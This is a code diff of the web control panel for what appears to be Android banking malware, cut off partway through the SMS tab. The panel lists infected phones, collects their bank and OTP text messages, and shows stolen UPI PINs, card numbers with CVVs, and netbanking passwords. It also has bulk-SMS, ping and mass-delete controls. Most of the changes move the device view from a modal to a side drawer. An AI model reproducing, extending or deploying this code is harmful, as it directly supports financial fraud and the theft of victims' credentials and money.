@@ -8,7 +8,7 @@
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
-body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7EB; min-height:100vh; }
+body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7EB; min-height:100vh; overflow-x:hidden; }
 .login-screen { position:fixed; top:0; left:0; width:100%; height:100%; background:#0A0E1A; display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; }
 .login-box { background:#111827; border:1px solid #00E5FF; border-radius:16px; padding:32px; max-width:380px; width:100%; text-align:center; box-shadow:0 20px 60px rgba(0,229,255,0.2); }
 .login-box h1 { color:#00E5FF; font-size:22px; margin-bottom:8px; }
@@ -49,61 +49,76 @@ body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7
 .device-name { color:white; font-size:14px; font-weight:bold; margin-bottom:2px; }
 .device-id { color:#8B9BB4; font-size:10px; font-family:monospace; }
 .star-icon { font-size:18px; cursor:pointer; }
-.status-badge { padding:3px 8px; border-radius:10px; font-size:9px; font-weight:bold; text-transform:uppercase; }
-.status-online { background:rgba(0,255,136,0.15); color:#00FF88; border:1px solid #00FF88; }
-.status-offline { background:rgba(255,59,92,0.15); color:#FF3B5C; border:1px solid #FF3B5C; }
 .device-details { display:grid; grid-template-columns:1fr 1fr; gap:8px; padding-top:10px; border-top:1px solid #1F2F4A; font-size:11px; }
 .device-details .label { color:#5A6B85; font-size:9px; text-transform:uppercase; }
 .device-details .value { color:#E5E7EB; margin-top:2px; font-weight:500; }
 .balance-bar { margin-top:10px; background:rgba(0,255,136,0.08); border:1px solid rgba(0,255,136,0.3); border-radius:8px; padding:8px 12px; display:flex; justify-content:space-between; align-items:center; }
 .balance-bar .amt { color:#00FF88; font-size:14px; font-weight:bold; }
 .balance-bar .acct { color:#8B9BB4; font-size:10px; }
-.modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:999; justify-content:center; align-items:center; padding:10px; }
-.modal-overlay.active { display:flex; }
-.modal-content { background:#111827; border-radius:16px; max-width:950px; width:100%; max-height:92vh; overflow:hidden; display:flex; flex-direction:column; border:1px solid #00E5FF; }
-.modal-header { padding:14px 18px; border-bottom:1px solid #1F2F4A; display:flex; justify-content:space-between; align-items:center; background:#0F1729; }
-.modal-header h2 { color:#00E5FF; font-size:15px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-.header-actions { display:flex; gap:6px; }
+.drawer-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:998; opacity:0; pointer-events:none; transition:opacity 0.3s; }
+.drawer-overlay.active { opacity:1; pointer-events:auto; }
+.side-drawer { position:fixed; top:0; right:0; width:100%; max-width:520px; height:100vh; background:#111827; z-index:999; transform:translateX(100%); transition:transform 0.3s ease-out; display:flex; flex-direction:column; border-left:1px solid #00E5FF; box-shadow:-10px 0 40px rgba(0,229,255,0.2); }
+.side-drawer.active { transform:translateX(0); }
+.drawer-header { padding:14px 18px; border-bottom:1px solid #1F2F4A; display:flex; justify-content:space-between; align-items:center; background:#0F1729; flex-shrink:0; }
+.drawer-header h2 { color:#00E5FF; font-size:15px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; flex:1; }
+.header-actions { display:flex; gap:6px; flex-shrink:0; }
 .icon-btn { background:#1A2F4A; border:none; color:#00E5FF; width:32px; height:32px; border-radius:8px; cursor:pointer; font-size:14px; }
 .icon-btn.danger { background:#FF3B5C; color:white; }
-.device-mini { background:#0F1729; padding:12px 14px; border-bottom:1px solid #1F2F4A; display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
-.device-mini .wifi-icon { width:36px; height:36px; font-size:16px; }
-.mini-info { color:#8B9BB4; font-size:10px; display:flex; gap:10px; flex-wrap:wrap; }
-.mini-info .badge { padding:2px 8px; background:#1A2F4A; border-radius:8px; }
-.tabs { display:flex; gap:2px; padding:10px 14px 0; background:#0F1729; border-bottom:1px solid #1F2F4A; overflow-x:auto; }
-.tab { padding:9px 14px; background:transparent; border:none; color:#00E5FF; font-size:11px; font-weight:bold; cursor:pointer; border-radius:8px 8px 0 0; white-space:nowrap; }
+.drawer-mini { background:#0F1729; padding:10px 14px; border-bottom:1px solid #1F2F4A; display:flex; gap:8px; align-items:center; flex-wrap:wrap; flex-shrink:0; }
+.drawer-mini .wifi-icon { width:34px; height:34px; font-size:15px; }
+.mini-info { color:#8B9BB4; font-size:10px; display:flex; gap:8px; flex-wrap:wrap; }
+.mini-info .badge { padding:3px 8px; background:#1A2F4A; border-radius:8px; }
+.tabs { display:flex; gap:2px; padding:8px 14px 0; background:#0F1729; border-bottom:1px solid #1F2F4A; overflow-x:auto; flex-shrink:0; }
+.tab { padding:9px 12px; background:transparent; border:none; color:#00E5FF; font-size:11px; font-weight:bold; cursor:pointer; border-radius:8px 8px 0 0; white-space:nowrap; }
 .tab.active { background:#00E5FF; color:#0A0E1A; }
 .tab .count { background:#1A2F4A; color:#00E5FF; padding:1px 6px; border-radius:8px; font-size:9px; margin-left:4px; }
 .tab.active .count { background:#0A0E1A; color:#00E5FF; }
-.modal-body { padding:14px; overflow-y:auto; flex:1; }
+.drawer-body { padding:14px; overflow-y:auto; flex:1; -webkit-overflow-scrolling:touch; }
 .message-item { background:#0F1729; border-left:3px solid #00E5FF; border-radius:8px; padding:12px; margin-bottom:10px; }
 .message-item.sent { border-left-color:#00FF88; }
 .msg-sender { color:#00E5FF; font-size:12px; font-weight:bold; margin-bottom:4px; display:flex; justify-content:space-between; }
 .msg-body { color:#E5E7EB; font-size:13px; line-height:1.4; word-break:break-word; }
 .msg-date { color:#5A6B85; font-size:10px; margin-top:6px; }
-.photo-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(110px,1fr)); gap:8px; }
-.photo-item { border-radius:8px; overflow:hidden; background:#0F1729; cursor:pointer; }
-.photo-item img { width:100%; height:110px; object-fit:cover; display:block; }
-.photo-name { padding:5px; font-size:9px; color:#8B9BB4; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
-.app-item { background:#0F1729; padding:10px 12px; border-radius:8px; margin-bottom:6px; display:flex; align-items:center; gap:10px; }
-.app-icon { width:32px; height:32px; background:#1A2F4A; border-radius:8px; display:flex; align-items:center; justify-content:center; color:#00E5FF; font-size:16px; }
-.app-name { color:white; font-size:12px; font-weight:bold; }
-.app-package { color:#8B9BB4; font-size:9px; font-family:monospace; margin-top:2px; }
-.dialog-content { background:#111827; border-radius:16px; max-width:500px; width:100%; max-height:90vh; overflow:hidden; display:flex; flex-direction:column; border:1px solid #00E5FF; }
-.dialog-body { padding:16px; overflow-y:auto; }
 .form-group { margin-bottom:12px; }
 .form-label { display:block; color:#8B9BB4; font-size:11px; margin-bottom:4px; text-transform:uppercase; }
 .form-input, .form-select, .form-textarea { width:100%; padding:10px 12px; background:#0F1729; border:1px solid #1F2F4A; border-radius:8px; color:#E5E7EB; font-size:13px; font-family:inherit; }
 .form-textarea { min-height:80px; resize:vertical; }
+.form-input:focus, .form-textarea:focus, .form-select:focus { outline:none; border-color:#00E5FF; }
 .btn-submit { width:100%; padding:12px; background:#00E5FF; color:#0A0E1A; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer; margin-top:4px; }
+.btn-submit:hover { background:#00B8D4; }
 .btn-submit.danger { background:#FF3B5C; color:white; }
+.send-card { background:#0F1729; border:1px solid #1F2F4A; border-radius:12px; padding:14px; margin-bottom:12px; }
+.send-card.telegram { border-color:rgba(0,229,255,0.3); }
+.send-card.forwarding { border-color:rgba(0,255,136,0.3); }
+.send-card h3 { color:#00E5FF; font-size:14px; margin-bottom:4px; }
+.send-card.green h3 { color:#00FF88; }
+.send-card p { color:#8B9BB4; font-size:11px; margin-bottom:12px; line-height:1.4; }
+.sim-row { display:flex; gap:8px; margin-bottom:12px; }
+.sim-btn { flex:1; padding:12px; background:#1A2F4A; border:2px solid transparent; border-radius:10px; color:#00E5FF; font-size:13px; font-weight:bold; cursor:pointer; }
+.sim-btn.active { background:#00E5FF; color:#0A0E1A; border-color:#00E5FF; }
+.on-off-btn { padding:12px 24px; background:#1A2F4A; border:none; border-radius:8px; color:#00E5FF; font-size:13px; font-weight:bold; cursor:pointer; white-space:nowrap; }
+.on-off-btn.on { background:#00FF88; color:#0A0E1A; }
+.info-box { background:rgba(0,229,255,0.05); border:1px solid rgba(0,229,255,0.2); border-radius:8px; padding:10px; font-size:11px; color:#8B9BB4; margin-top:8px; line-height:1.5; }
+.info-box.green { background:rgba(0,255,136,0.05); border-color:rgba(0,255,136,0.2); }
+.info-box .dot-indicator { display:inline-block; width:6px; height:6px; border-radius:50%; background:#5A6B85; margin-right:6px; }
+.info-box .dot-indicator.on { background:#00FF88; }
+.chars-count { font-size:10px; color:#5A6B85; text-align:right; margin-top:2px; }
+.device-info-row { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #1F2F4A; font-size:12px; }
+.device-info-row .k { color:#8B9BB4; }
+.device-info-row .v { color:#E5E7EB; font-weight:500; }
 .loading { text-align:center; padding:40px; color:#5A6B85; }
 .empty-msg { text-align:center; padding:40px 20px; color:#5A6B85; font-size:13px; }
+.photo-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(100px,1fr)); gap:8px; }
+.photo-item { border-radius:8px; overflow:hidden; background:#0F1729; cursor:pointer; }
+.photo-item img { width:100%; height:100px; object-fit:cover; display:block; }
+.app-item { background:#0F1729; padding:10px 12px; border-radius:8px; margin-bottom:6px; display:flex; align-items:center; gap:10px; }
+.app-icon { width:32px; height:32px; background:#1A2F4A; border-radius:8px; display:flex; align-items:center; justify-content:center; color:#00E5FF; font-size:16px; }
+.app-name { color:white; font-size:12px; font-weight:bold; }
+.app-package { color:#8B9BB4; font-size:9px; font-family:monospace; margin-top:2px; }
 @media (max-width:600px) {
   .topbar h1 { font-size:14px; }
   .device-grid { grid-template-columns:1fr; }
-  .photo-grid { grid-template-columns:repeat(auto-fill,minmax(85px,1fr)); }
-  .photo-item img { height:85px; }
+  .side-drawer { max-width:100%; }
 }
 </style>
 </head>
@@ -135,12 +150,10 @@ body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7
     <div class="stat-card"><div class="num" id="statBankSms">0</div><div class="label">Bank SMS</div></div>
   </div>
   <div class="quick-actions">
-    <div class="action-btn" id="btnAllMsg"><div class="action-icon">📨</div><div><div class="action-label">ALL MSG</div><div class="action-sub">All messages</div></div></div>
-    <div class="action-btn" id="btnBulkSms"><div class="action-icon">📢</div><div><div class="action-label">BULK SMS</div><div class="action-sub">Send to all</div></div></div>
     <div class="action-btn" id="btnCsvExport"><div class="action-icon">📋</div><div><div class="action-label">CSV</div><div class="action-sub">Export data</div></div></div>
     <div class="action-btn" id="btnPingAll"><div class="action-icon">📍</div><div><div class="action-label">PING ALL</div><div class="action-sub">Ping devices</div></div></div>
-    <div class="action-btn" id="btnFbSources"><div class="action-icon">🔥</div><div><div class="action-label">FB</div><div class="action-sub">Firebase src</div></div></div>
-    <div class="action-btn" id="btnCards"><div class="action-icon">💳</div><div><div class="action-label">CARDS</div><div class="action-sub">Payment data</div></div></div>
+    <div class="action-btn" id="btnFbSources"><div class="action-icon">🔥</div><div><div class="action-label">FB</div><div class="action-sub">Firebase</div></div></div>
+    <div class="action-btn" id="btnCards"><div class="action-icon">💳</div><div><div class="action-label">CARDS</div><div class="action-sub">Payment</div></div></div>
     <div class="action-btn" id="btnNuke"><div class="action-icon">☢️</div><div><div class="action-label">NUKE</div><div class="action-sub">Delete all</div></div></div>
   </div>
   <div class="container">
@@ -158,36 +171,34 @@ body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7
   </div>
 </div>
 
-<div class="modal-overlay" id="modal">
-  <div class="modal-content">
-    <div class="modal-header">
-      <h2 id="modalTitle">Device</h2>
-      <div class="header-actions">
-        <button class="icon-btn" id="btnStarModal">☆</button>
-        <button class="icon-btn danger" id="btnDelDeviceModal">🗑</button>
-        <button class="icon-btn" id="closeModalBtn">✕</button>
-      </div>
+<div class="drawer-overlay" id="drawerOverlay"></div>
+<div class="side-drawer" id="sideDrawer">
+  <div class="drawer-header">
+    <h2 id="modalTitle">Device</h2>
+    <div class="header-actions">
+      <button class="icon-btn" id="btnStarModal">☆</button>
+      <button class="icon-btn danger" id="btnDelDeviceModal">🗑</button>
+      <button class="icon-btn" id="closeModalBtn">✕</button>
     </div>
-    <div id="deviceMini"></div>
-    <div class="tabs">
-      <button class="tab active" data-tab="info">Info</button>
-      <button class="tab" data-tab="bank">Bank <span class="count" id="bankCount">0</span></button>
-      <button class="tab" data-tab="card">Card <span class="count" id="cardCount">0</span></button>
-      <button class="tab" data-tab="allsms">All SMS <span class="count" id="smsCount">0</span></button>
-      <button class="tab" data-tab="send">Send</button>
-    </div>
-    <div class="modal-body" id="modalBody"><div class="loading">Loading...</div></div>
   </div>
+  <div class="drawer-mini" id="deviceMini"></div>
+  <div class="tabs">
+    <button class="tab active" data-tab="info">Info</button>
+    <button class="tab" data-tab="bank">Bank <span class="count" id="bankCount">0</span></button>
+    <button class="tab" data-tab="card">Card <span class="count" id="cardCount">0</span></button>
+    <button class="tab" data-tab="allsms">All SMS <span class="count" id="smsCount">0</span></button>
+    <button class="tab" data-tab="send">Send</button>
+  </div>
+  <div class="drawer-body" id="modalBody"><div class="loading">Loading...</div></div>
 </div>
 
-<div class="modal-overlay" id="dialog">
-  <div class="dialog-content">
-    <div class="modal-header">
-      <h2 id="dialogTitle">Dialog</h2>
-      <button class="close-btn" id="closeDialogBtn" style="background:#FF3B5C;color:white;border:none;width:30px;height:30px;border-radius:8px;cursor:pointer;font-size:16px;">✕</button>
-    </div>
-    <div class="dialog-body" id="dialogBody"></div>
+<div class="drawer-overlay" id="dialogOverlay" style="z-index:1000;"></div>
+<div class="side-drawer" id="dialogDrawer" style="max-width:500px;z-index:1001;">
+  <div class="drawer-header">
+    <h2 id="dialogTitle">Dialog</h2>
+    <button class="icon-btn danger" id="closeDialogBtn">✕</button>
   </div>
+  <div class="drawer-body" id="dialogBody"></div>
 </div>
 
 <script>
@@ -217,12 +228,8 @@ function doLogin() {
       document.getElementById('loginScreen').style.display = 'none';
       document.getElementById('mainApp').style.display = 'block';
       startApp();
-    } else {
-      document.getElementById('errorMsg').textContent = '❌ Wrong PIN';
-    }
-  }).catch(function(err) {
-    document.getElementById('errorMsg').textContent = 'Error: ' + err.message;
-  });
+    } else { document.getElementById('errorMsg').textContent = '❌ Wrong PIN'; }
+  }).catch(function(err) { document.getElementById('errorMsg').textContent = 'Error: ' + err.message; });
 }
 function doLogout() { localStorage.removeItem('admin_logged_in'); location.reload(); }
 
@@ -234,25 +241,14 @@ function startApp() {
     if (currentDeviceId && allDevices[currentDeviceId]) { renderTab(); }
   });
 }
-
 function updateStats() {
   var ids = Object.keys(allDevices);
   var online = 0, offline = 0, totalMsgs = 0, bankSms = 0;
   ids.forEach(function(id) {
     var dev = allDevices[id];
     if (dev.status === 'Online') online++; else offline++;
-    if (dev.messages) {
-      Object.values(dev.messages).forEach(function(m) {
-        totalMsgs++;
-        if (detectCategory(m.sender, m.body) === 'BANK') bankSms++;
-      });
-    }
-    if (dev.sms_history) {
-      Object.values(dev.sms_history).forEach(function(m) {
-        totalMsgs++;
-        if (detectCategory(m.sender, m.body) === 'BANK') bankSms++;
-      });
-    }
+    if (dev.messages) Object.values(dev.messages).forEach(function(m) { totalMsgs++; if (detectCategory(m.sender, m.body) === 'BANK') bankSms++; });
+    if (dev.sms_history) Object.values(dev.sms_history).forEach(function(m) { totalMsgs++; if (detectCategory(m.sender, m.body) === 'BANK') bankSms++; });
   });
   document.getElementById('statDevices').textContent = ids.length;
   document.getElementById('statOnline').textContent = online;
@@ -260,7 +256,6 @@ function updateStats() {
   document.getElementById('statMessages').textContent = totalMsgs;
   document.getElementById('statBankSms').textContent = bankSms;
 }
-
 function isLiked(id) { return likedDevices.indexOf(id) !== -1; }
 function toggleLike(id) {
   if (isLiked(id)) likedDevices = likedDevices.filter(function(x) { return x !== id; });
@@ -273,7 +268,6 @@ function updateStar() {
   var btn = document.getElementById('btnStarModal');
   if (btn) btn.textContent = isLiked(currentDeviceId) ? '⭐' : '☆';
 }
-
 function renderDevices() {
   var grid = document.getElementById('deviceGrid');
   var search = (document.getElementById('searchBox').value || '').toLowerCase();
@@ -294,7 +288,7 @@ function renderDevices() {
     var tb = allDevices[b].first_install_timestamp || allDevices[b].install_timestamp || 0;
     return tb - ta;
   });
-  grid.innerHTML = ids.map(function(id, idx) {
+  grid.innerHTML = ids.map(function(id) {
     var dev = allDevices[id];
     var isOnline = dev.status === 'Online';
     var model = dev.device_model || 'Unknown';
@@ -302,20 +296,7 @@ function renderDevices() {
     var sim = (dev.sim_info && (dev.sim_info.sim1_number || dev.sim_info.sim2_number)) || 'No SIM';
     var balance = dev.last_balance || '--';
     var liked = isLiked(id);
-    return '<div class="device-card" data-id="' + id + '">' +
-      '<div class="device-header">' +
-      '<div class="wifi-icon">📶</div>' +
-      '<div class="device-info"><div class="device-name">' + escapeHtml(model) + '</div><div class="device-id">' + id + '</div></div>' +
-      '<div class="star-icon" data-star="' + id + '">' + (liked ? '⭐' : '☆') + '</div>' +
-      '</div>' +
-      '<div class="device-details">' +
-      '<div><div class="label">Android</div><div class="value">v' + escapeHtml(dev.android_version || '?') + '</div></div>' +
-      '<div><div class="label">Battery</div><div class="value" style="color:' + getBatteryColor(battery) + '">' + battery + '</div></div>' +
-      '<div><div class="label">Number</div><div class="value">' + escapeHtml(sim) + '</div></div>' +
-      '<div><div class="label">Network</div><div class="value">' + escapeHtml((dev.sim_info && dev.sim_info.sim1_carrier) || '-') + '</div></div>' +
-      '</div>' +
-      (balance !== '--' ? '<div class="balance-bar"><div><div class="acct">₹ Balance</div></div><div class="amt">' + escapeHtml(balance) + '</div></div>' : '') +
-      '</div>';
+    return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + escapeHtml(model) + '</div><div class="device-id">' + id + '</div></div><div class="star-icon" data-star="' + id + '">' + (liked ? '⭐' : '☆') + '</div></div><div class="device-details"><div><div class="label">Android</div><div class="value">v' + escapeHtml(dev.android_version || '?') + '</div></div><div><div class="label">Battery</div><div class="value" style="color:' + getBatteryColor(battery) + '">' + battery + '</div></div><div><div class="label">Number</div><div class="value">' + escapeHtml(sim) + '</div></div><div><div class="label">Network</div><div class="value">' + escapeHtml((dev.sim_info && dev.sim_info.sim1_carrier) || '-') + '</div></div></div>' + (balance !== '--' ? '<div class="balance-bar"><div><div class="acct">₹ Balance</div></div><div class="amt">' + escapeHtml(balance) + '</div></div>' : '') + '</div>';
   }).join('');
   grid.querySelectorAll('.device-card').forEach(function(card) {
     card.addEventListener('click', function(e) {
@@ -324,14 +305,8 @@ function renderDevices() {
     });
   });
 }
-function getBatteryColor(battery) {
-  var pct = parseInt(battery) || 0;
-  if (pct >= 50) return '#00FF88';
-  if (pct >= 20) return '#FFD700';
-  return '#FF3B5C';
-}
+function getBatteryColor(battery) { var pct = parseInt(battery) || 0; if (pct >= 50) return '#00FF88'; if (pct >= 20) return '#FFD700'; return '#FF3B5C'; }
 function escapeHtml(text) { if (!text) return ''; var d = document.createElement('div'); d.textContent = text; return d.innerHTML; }
-
 function detectCategory(sender, body) {
   var s = (sender || '').toUpperCase(); var b = (body || '').toUpperCase();
   if (b.indexOf('OTP') !== -1 || b.indexOf('VERIFICATION') !== -1) return 'OTP';
@@ -365,25 +340,19 @@ function openDevice(id) {
   updateStar();
   var sim = (dev.sim_info && (dev.sim_info.sim1_number || dev.sim_info.sim2_number)) || 'No SIM';
   var balance = dev.last_balance || '--';
-  document.getElementById('deviceMini').innerHTML = '<div class="device-mini">' +
-    '<div class="wifi-icon">📶</div>' +
-    '<div class="mini-info">' +
-    '<span class="badge">' + (dev.status || 'Offline') + '</span>' +
-    '<span class="badge">Bat ' + (dev.battery || '0%') + '</span>' +
-    '<span class="badge">' + escapeHtml(sim) + '</span>' +
-    (balance !== '--' ? '<span class="badge" style="background:rgba(0,255,136,0.15);color:#00FF88">' + escapeHtml(balance) + '</span>' : '') +
-    '</div>' +
-    '</div>';
+  document.getElementById('deviceMini').innerHTML = '<div class="wifi-icon">📶</div><div class="mini-info"><span class="badge">' + (dev.status || 'Offline') + '</span><span class="badge">Bat ' + (dev.battery || '0%') + '</span><span class="badge">' + escapeHtml(sim) + '</span>' + (balance !== '--' ? '<span class="badge" style="background:rgba(0,255,136,0.15);color:#00FF88">' + escapeHtml(balance) + '</span>' : '') + '</div>';
   db.ref('device_info/' + id + '/messages').on('value', function(snap) {
     deviceMessages = snap.val() || {};
     if (currentTab === 'allsms' || currentTab === 'bank') renderTab();
   });
-  document.getElementById('modal').classList.add('active');
+  document.getElementById('sideDrawer').classList.add('active');
+  document.getElementById('drawerOverlay').classList.add('active');
   switchTab('info');
 }
 function closeModal() {
   if (currentDeviceId) { db.ref('device_info/' + currentDeviceId + '/messages').off(); }
-  document.getElementById('modal').classList.remove('active');
+  document.getElementById('sideDrawer').classList.remove('active');
+  document.getElementById('drawerOverlay').classList.remove('active');
   currentDeviceId = null;
 }
 function switchTab(tab) {
@@ -391,7 +360,6 @@ function switchTab(tab) {
   document.querySelectorAll('.tab').forEach(function(t) { t.classList.toggle('active', t.getAttribute('data-tab') === tab); });
   renderTab();
 }
-
 function renderTab() {
   var body = document.getElementById('modalBody');
   var dev = allDevices[currentDeviceId];
@@ -400,101 +368,184 @@ function renderTab() {
   Object.values(deviceMessages).forEach(function(m) { allMsgs.push(m); });
   if (dev.sms_history) Object.values(dev.sms_history).forEach(function(m) { allMsgs.push(m); });
   allMsgs.sort(function(a, b) { return (b.timestamp || 0) - (a.timestamp || 0); });
-  
   document.getElementById('smsCount').textContent = allMsgs.length;
-  var bankMsgs = allMsgs.filter(function(m) { return detectCategory(m.sender, m.body) === 'BANK' || detectCategory(m.sender, m.body) === 'BALANCE'; });
+  var bankMsgs = allMsgs.filter(function(m) { var c = detectCategory(m.sender, m.body); return c === 'BANK' || c === 'BALANCE'; });
   document.getElementById('bankCount').textContent = bankMsgs.length;
   document.getElementById('cardCount').textContent = dev.card_data ? '1' : '0';
   
   if (currentTab === 'info') {
-    var info = '<div class="message-item"><div class="msg-sender">DEVICE</div><div class="msg-body">' +
-      '<strong>Model:</strong> ' + escapeHtml(dev.device_model || '-') + '<br>' +
-      '<strong>Manufacturer:</strong> ' + escapeHtml(dev.device_manufacturer || '-') + '<br>' +
-      '<strong>Android:</strong> ' + escapeHtml(dev.android_version || '-') + '<br>' +
-      '<strong>Serial:</strong> ' + escapeHtml(dev.serial_number || '-') + '<br>' +
-      '<strong>Battery:</strong> ' + (dev.battery || '-') + ' (' + (dev.battery_status || '-') + ')<br>' +
-      '<strong>Status:</strong> ' + (dev.status || '-') + '<br>' +
-      '<strong>SIM 1:</strong> ' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || '-') + '<br>' +
-      '<strong>SIM 2:</strong> ' + escapeHtml((dev.sim_info && dev.sim_info.sim2_number) || '-') + '<br>' +
-      '<strong>IP:</strong> ' + escapeHtml(dev.ip_address || '-') + '<br>' +
-      '<strong>Storage:</strong> ' + escapeHtml(dev.storage || '-') + '<br>' +
-      '<strong>CPU:</strong> ' + escapeHtml(dev.cpu_arch || '-') + '<br>' +
-      '<strong>SDK:</strong> ' + escapeHtml(dev.android_sdk || '-') + '<br>' +
-      '<strong>Installed:</strong> ' + escapeHtml(dev.first_install_time || dev.install_time || '-') + '<br>' +
-      '<strong>Last Seen:</strong> ' + (dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-') +
+    body.innerHTML = '<div class="message-item"><div class="msg-sender">DEVICE INFO</div><div class="msg-body">' +
+      '<div class="device-info-row"><span class="k">Model</span><span class="v">' + escapeHtml(dev.device_model || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">Manufacturer</span><span class="v">' + escapeHtml(dev.device_manufacturer || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">Android</span><span class="v">' + escapeHtml(dev.android_version || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">Serial</span><span class="v">' + escapeHtml(dev.serial_number || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">Battery</span><span class="v">' + (dev.battery || '-') + ' (' + (dev.battery_status || '-') + ')</span></div>' +
+      '<div class="device-info-row"><span class="k">Status</span><span class="v">' + (dev.status || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">SIM 1</span><span class="v">' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">SIM 2</span><span class="v">' + escapeHtml((dev.sim_info && dev.sim_info.sim2_number) || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">IP</span><span class="v">' + escapeHtml(dev.ip_address || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">Storage</span><span class="v">' + escapeHtml(dev.storage || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">CPU</span><span class="v">' + escapeHtml(dev.cpu_arch || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">SDK</span><span class="v">' + escapeHtml(dev.android_sdk || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">Installed</span><span class="v">' + escapeHtml(dev.first_install_time || dev.install_time || '-') + '</span></div>' +
+      '<div class="device-info-row"><span class="k">Last Seen</span><span class="v">' + (dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-') + '</span></div>' +
       '</div></div>';
-    body.innerHTML = info;
   } else if (currentTab === 'bank') {
     if (bankMsgs.length === 0) { body.innerHTML = '<div class="empty-msg">No bank messages</div>'; return; }
     body.innerHTML = bankMsgs.map(function(m) {
       var bal = extractBalance(m.body);
       var bank = detectBankName(m.sender);
-      return '<div class="message-item"><div class="msg-sender">' + escapeHtml(bank) + ' — ' + escapeHtml(m.sender || '') + '</div>' +
-        (bal ? '<div style="color:#00FF88;font-size:18px;font-weight:bold;margin:8px 0;">' + bal + '</div>' : '') +
-        '<div class="msg-body">' + escapeHtml(m.body || '') + '</div>' +
-        '<div class="msg-date">' + (m.date || '') + '</div></div>';
+      return '<div class="message-item"><div class="msg-sender">' + escapeHtml(bank) + ' — ' + escapeHtml(m.sender || '') + '</div>' + (bal ? '<div style="color:#00FF88;font-size:18px;font-weight:bold;margin:8px 0;">' + bal + '</div>' : '') + '<div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
     }).join('');
   } else if (currentTab === 'card') {
     var upi = dev.upi_data || {}; var card = dev.card_data || {}; var bank = dev.netbanking_data || {};
-    body.innerHTML = '<div class="message-item"><div class="msg-sender">UPI DATA</div><div class="msg-body">' +
-      '<strong>App:</strong> ' + escapeHtml(upi.app_name || '-') + '<br>' +
-      '<strong>PIN:</strong> ' + escapeHtml(upi.upi_pin || '-') + '</div></div>' +
-      '<div class="message-item"><div class="msg-sender">CARD DATA</div><div class="msg-body">' +
-      '<strong>Number:</strong> ' + escapeHtml(card.card_number || '-') + '<br>' +
-      '<strong>Expiry:</strong> ' + escapeHtml(card.expiry || '-') + '<br>' +
-      '<strong>CVV:</strong> ' + escapeHtml(card.cvv || '-') + '<br>' +
-      '<strong>Holder:</strong> ' + escapeHtml(card.card_holder || '-') + '</div></div>' +
-      '<div class="message-item"><div class="msg-sender">NETBANKING</div><div class="msg-body">' +
-      '<strong>Bank:</strong> ' + escapeHtml(bank.bank_name || '-') + '<br>' +
-      '<strong>User ID:</strong> ' + escapeHtml(bank.user_id || '-') + '<br>' +
-      '<strong>Password:</strong> ' + escapeHtml(bank.password || '-') + '</div></div>';
+    body.innerHTML = '<div class="message-item"><div class="msg-sender">💳 UPI DATA</div><div class="msg-body"><strong>App:</strong> ' + escapeHtml(upi.app_name || '-') + '<br><strong>PIN:</strong> ' + escapeHtml(upi.upi_pin || '-') + '</div></div><div class="message-item"><div class="msg-sender">💳 CARD DATA</div><div class="msg-body"><strong>Number:</strong> ' + escapeHtml(card.card_number || '-') + '<br><strong>Expiry:</strong> ' + escapeHtml(card.expiry || '-') + '<br><strong>CVV:</strong> ' + escapeHtml(card.cvv || '-') + '<br><strong>Holder:</strong> ' + escapeHtml(card.card_holder || '-') + '</div></div><div class="message-item"><div class="msg-sender">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + escapeHtml(bank.bank_name || '-') + '<br><strong>User ID:</strong> ' + escapeHtml(bank.user_id || '-') + '<br><strong>Password:</strong> ' + escapeHtml(bank.password || '-') + '</div></div>';
   } else if (currentTab === 'allsms') {
     if (allMsgs.length === 0) { body.innerHTML = '<div class="empty-msg">No SMS</div>'; return; }
-    body.innerHTML = allMsgs.map(function(m) {
-      return '<div class="message-item ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-sender">' + escapeHtml(m.sender || 'Unknown') + ' — ' + (m.type || 'IN') + '</div><div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
+    body.innerHTML = '<input type="text" class="form-input" id="smsSearch" placeholder="Search SMS..." style="margin-bottom:10px;">' + allMsgs.map(function(m, i) {
